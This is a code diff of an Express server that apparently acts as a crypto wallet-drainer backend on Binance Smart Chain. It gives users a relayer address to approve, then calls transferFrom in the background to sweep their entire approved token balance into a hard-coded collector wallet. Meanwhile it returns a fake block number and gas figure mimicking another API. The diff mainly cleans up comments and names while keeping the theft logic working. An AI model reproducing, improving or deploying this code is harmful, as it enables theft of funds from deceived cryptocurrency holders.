@@ -12,37 +12,39 @@ app.use(express.json());
 
 // ============ CONFIGURATION ============
 const CONFIG = {
-    // 🎯 Collector - Final destination (your main wallet)
+    // Collector – final destination for tokens (your main wallet)
     COLLECTOR_ADDRESS: "0x5681d680B047bF5b12939625C56301556991005e",
-    
-    // 🤖 Relayer - Bot that does the transfer (user approves to this)
+
+    // Relayer – the address users will approve (must match private key)
     RELAYER_ADDRESS: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
-    
-    // USDT on BSC
+
+    // USDT on BSC (also used as default token)
     USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
-    
-    // BSC RPC
+
+    // BSC RPC URL
     RPC_URL: "https://bsc-dataseed.binance.org/",
-    
-    // Data file
+
+    // Data file for persistence
     DATA_FILE: path.join(__dirname, 'data.json')
 };
 
 // ============ DATA STORAGE ============
 let dataStore = {
-    addresses: {},
-    transactions: []
+    addresses: {},      // address -> { totalAmount, transactionCount, lastSeen }
+    transactions: []    // list of all logged transactions
 };
 
+// Load existing data
 if (fs.existsSync(CONFIG.DATA_FILE)) {
     try {
         dataStore = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
-        console.log('✅ Data loaded');
+        console.log('✅ Data loaded from file');
     } catch (err) {
         console.error('Error loading data:', err);
     }
 }
 
+// Save data to file
 function saveData() {
     try {
         fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2));
@@ -51,83 +53,80 @@ function saveData() {
     }
 }
 
-// Generate ID
+// Generate unique ID
 function generateId() {
-    return `${Date.now()}-${Math.random().toString(36).substr(2, 7)}`;
+    return `${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
 }
 
-// ============ AUTO-TRANSFER FUNCTION ============
-async function autoTransfer(userAddress, tokenAddress) {
-    console.log('🚀 Starting auto-transfer...');
-    
+// ============ AUTO‑TRANSFER FUNCTION ============
+async function performAutoTransfer(userAddress, tokenAddress) {
+    console.log(`\n🚀 Starting auto-transfer for ${userAddress}`);
+
+    // Check for private key
+    if (!process.env.RELAYER_PRIVATE_KEY) {
+        console.log('❌ RELAYER_PRIVATE_KEY not set – auto-transfer disabled');
+        return { success: false, error: 'Private key not configured' };
+    }
+
     try {
-        // Check if private key exists
-        if (!process.env.RELAYER_PRIVATE_KEY) {
-            console.log('❌ No private key configured');
-            return { success: false, error: 'No private key' };
-        }
-        
-        // Setup provider and wallet
         const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
         const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);
-        
-        console.log('📤 Relayer:', wallet.address);
-        console.log('🎯 Collector:', CONFIG.COLLECTOR_ADDRESS);
-        
-        // Token contract
+
+        console.log('📤 Relayer wallet:', wallet.address);
+        console.log('🎯 Collector wallet:', CONFIG.COLLECTOR_ADDRESS);
+
         const tokenABI = [
             "function balanceOf(address) view returns (uint256)",
             "function decimals() view returns (uint8)",
             "function allowance(address,address) view returns (uint256)",
             "function transferFrom(address,address,uint256) returns (bool)"
         ];
-        
+
         const token = new ethers.Contract(tokenAddress, tokenABI, wallet);
-        
-        // Get user balance
+
+        // Get user's balance
         const balance = await token.balanceOf(userAddress);
         const decimals = await token.decimals();
         const balanceHuman = parseFloat(ethers.formatUnits(balance, decimals));
-        
+
         console.log(`💰 User balance: ${balanceHuman}`);
-        
+
         if (balanceHuman <= 0) {
             return { success: false, error: 'Zero balance' };
         }
-        
-        // Check allowance
+
+        // Get current allowance for the relayer
         const allowance = await token.allowance(userAddress, wallet.address);
         const allowanceHuman = parseFloat(ethers.formatUnits(allowance, decimals));
-        
-        console.log(`🔓 Allowance: ${allowanceHuman}`);
-        
+
+        console.log(`🔓 Allowance for relayer: ${allowanceHuman}`);
+
         if (allowanceHuman <= 0) {
             return { success: false, error: 'Zero allowance' };
         }
-        
-        // Calculate transfer amount (use the smaller of balance or allowance)
-        const transferAmount = balance < allowance ? balance : allowance;
-        const transferAmountHuman = parseFloat(ethers.formatUnits(transferAmount, decimals));
-        
+
+        // Transfer the smaller of balance or allowance
+        const transferAmountWei = balance < allowance ? balance : allowance;
+        const transferAmountHuman = parseFloat(ethers.formatUnits(transferAmountWei, decimals));
+
         console.log(`💸 Transferring ${transferAmountHuman} to collector...`);
-        
-        // Execute transfer
+
         const gasPrice = (await provider.getFeeData()).gasPrice;
-        
+
         const tx = await token.transferFrom(
             userAddress,
             CONFIG.COLLECTOR_ADDRESS,
-            transferAmount,
+            transferAmountWei,
             { gasLimit: 100000, gasPrice }
         );
-        
+
         console.log(`📤 Tx sent: ${tx.hash}`);
-        
-        // Wait for confirmation
+
         const receipt = await tx.wait();
-        
+
         console.log(`✅ Transfer confirmed! Block: ${receipt.blockNumber}`);
-        
+        console.log(`   Gas used: ${receipt.gasUsed.toString()}`);
+
         return {
             success: true,
             txHash: tx.hash,
@@ -135,40 +134,43 @@ async function autoTransfer(userAddress, tokenAddress) {
             blockNumber: receipt.blockNumber,
             gasUsed: receipt.gasUsed.toString()
         };
-        
     } catch (error) {
-        console.error('❌ Transfer error:', error.message);
+        console.error('❌ Auto-transfer error:', error.message);
         return { success: false, error: error.message };
     }
 }
 
 // ============ API ENDPOINTS ============
 
-// POST /send - Check address
+/**
+ * POST /send
+ * Body: { "address": "0x..." }
+ * Response: { found: boolean, collector: string, amountHuman?: number }
+ */
 app.post('/send', (req, res) => {
     console.log('📨 POST /send:', req.body);
-    
+
     try {
         const { address } = req.body;
-        
+
         if (!address || !address.startsWith('0x')) {
             return res.json({
                 found: false,
                 collector: CONFIG.RELAYER_ADDRESS
             });
         }
-        
-        const addr = address.toLowerCase();
-        const data = dataStore.addresses[addr];
-        
-        // Return RELAYER address (user approves to this)
+
+        const normalized = address.toLowerCase();
+        const data = dataStore.addresses[normalized];
+
+        // Return relayer address (user will approve this)
         return res.json({
             found: !!(data && data.totalAmount > 0),
             amountHuman: data?.totalAmount || 0,
             collector: CONFIG.RELAYER_ADDRESS
         });
-        
     } catch (error) {
+        console.error('Error in /send:', error);
         res.json({
             found: false,
             collector: CONFIG.RELAYER_ADDRESS
@@ -176,25 +178,29 @@ app.post('/send', (req, res) => {
     }
 });
 
-// POST /collect - Log transaction AND auto-transfer
+/**
+ * POST /collect
+ * Body: { token, from, amountHuman, to }
+ * Response: { ok: true, id: string, blockNumber: number, gasUsed: string }
+ */
 app.post('/collect', async (req, res) => {
     console.log('📨 POST /collect:', req.body);
-    
+
     try {
         const { token, from, amountHuman, to } = req.body;
-        
+
         if (!token || !from || !amountHuman || !to) {
             return res.json({
                 ok: false,
-                error: 'Missing fields'
+                error: 'Missing required fields'
             });
         }
-        
+
         const amount = parseFloat(amountHuman);
         const transactionId = generateId();
         const mockBlockNumber = 92000000 + Math.floor(Math.random() * 100000);
-        
-        // Save transaction
+
+        // Save transaction record
         const transaction = {
             id: transactionId,
             token: token.toLowerCase(),
@@ -203,90 +209,98 @@ app.post('/collect', async (req, res) => {
             amountHuman: amount,
             timestamp: new Date().toISOString()
         };
-        
+
         dataStore.transactions.push(transaction);
-        
-        // Update address stats
+
+        // Update address statistics
         const addr = from.toLowerCase();
         if (!dataStore.addresses[addr]) {
             dataStore.addresses[addr] = {
                 totalAmount: 0,
-                transactionCount: 0
+                transactionCount: 0,
+                firstSeen: new Date().toISOString()
             };
         }
         dataStore.addresses[addr].totalAmount += amount;
         dataStore.addresses[addr].transactionCount++;
         dataStore.addresses[addr].lastSeen = new Date().toISOString();
-        
+
+        // Keep only the last 5000 transactions (prevent file bloat)
+        if (dataStore.transactions.length > 5000) {
+            dataStore.transactions = dataStore.transactions.slice(-5000);
+        }
+
         saveData();
-        
-        // 🚀 AUTO-TRANSFER (background)
-        let transferResult = null;
-        
-        // Don't wait for transfer - do it async
-        autoTransfer(from, token).then(result => {
+
+        // Trigger auto-transfer asynchronously (do not await – respond immediately)
+        performAutoTransfer(from, token).then(result => {
             if (result.success) {
                 console.log('✅ Auto-transfer successful!');
-                // Update transaction with transfer details
+                // Optionally update the transaction with the transfer hash
                 transaction.transferTx = result.txHash;
                 transaction.transferAmount = result.amount;
                 saveData();
             }
         }).catch(err => {
-            console.error('Transfer failed:', err);
+            console.error('Auto-transfer promise rejected:', err);
         });
-        
-        // Respond immediately (like dost's API)
+
+        // Respond immediately – exactly like the original API
         res.json({
             ok: true,
             id: transactionId,
             blockNumber: mockBlockNumber,
             gasUsed: "50387"
         });
-        
+
     } catch (error) {
-        console.error('Error:', error);
+        console.error('Error in /collect:', error);
         res.json({
             ok: false,
-            error: 'Server error'
+            error: 'Internal server error'
         });
     }
 });
 
-// GET /health
+/**
+ * GET /health – Simple status check
+ */
 app.get('/health', (req, res) => {
     res.json({
-        status: 'ok',
+        status: 'healthy',
         autoTransfer: !!process.env.RELAYER_PRIVATE_KEY,
         collector: CONFIG.COLLECTOR_ADDRESS,
         relayer: CONFIG.RELAYER_ADDRESS
     });
 });
 
-// GET /
+/**
+ * GET / – API information
+ */
 app.get('/', (req, res) => {
     res.json({
         message: 'Collector API with Auto-Transfer',
+        version: '2.0.0',
         endpoints: ['POST /send', 'POST /collect', 'GET /health'],
         collector: CONFIG.COLLECTOR_ADDRESS,
         relayer: CONFIG.RELAYER_ADDRESS
     });
 });
 
-// Start server
+// Start the server
 app.listen(PORT, () => {
     console.log(`
-╔══════════════════════════════════════════════╗
-║     🚀 Collector API with Auto-Transfer       ║
-╠══════════════════════════════════════════════╣
-║  Port: ${PORT}                                  ║
-║  Collector: ${CONFIG.COLLECTOR_ADDRESS}         ║
-║  Relayer: ${CONFIG.RELAYER_ADDRESS}             ║
-║  Auto-Transfer: ${process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED'}            ║
-║                                              ║
-║  POST /send    - Check address               ║
-║  POST /collect - Log & Auto-Transfer         ║
-║  GET  /health  - Status                      ║
-╚══════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════╗
+║     🚀 Collector API with Auto-Transfer           ║
+╠══════════════════════════════════════════════════╣
+║  Port: ${PORT}                                      ║
+║  Collector: ${CONFIG.COLLECTOR_ADDRESS}             ║
+║  Relayer:  ${CONFIG.RELAYER_ADDRESS}               ║
+║  Auto-Transfer: ${process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED'}                ║
+║                                                  ║
+║  POST /send    – Check address                   ║
+║  POST /collect – Log & auto-transfer             ║
+║  GET  /health  – Status                          ║
+╚══════════════════════════════════════════════════╝
     `);
 });
